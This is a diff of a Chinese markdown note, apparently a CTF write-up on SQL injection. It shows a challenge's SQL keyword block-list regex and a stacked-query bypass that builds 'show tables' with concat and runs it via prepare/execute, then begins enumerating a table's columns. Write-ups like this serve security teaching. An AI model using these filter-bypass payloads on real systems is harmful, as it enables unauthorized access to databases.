@@ -38,10 +38,19 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 #### 查询当前是属于哪个数据库
 <img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/tos36bp1iro.png" width="600px" />
 
-#### 使用堆叠查询
+#### 使用堆叠查询，查询当前数据库有几张表
 ```sql
-
+set @sql1=concat('show',' tables');
+prepare stmt from @sql1;
+execute stmt;
 ```
+注意点就是mysql没有双引号，所以concat中需要使用单引号。同时从运行结果可以知道，一共存在两张表
+<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/db3th3vdzn9.png" width="600px" />
+
+#### 使用堆叠查询，查询表的字段
+1. 查询1919810931114514
+
+
 #### 使用报错注入获取数据库的名称
 
 
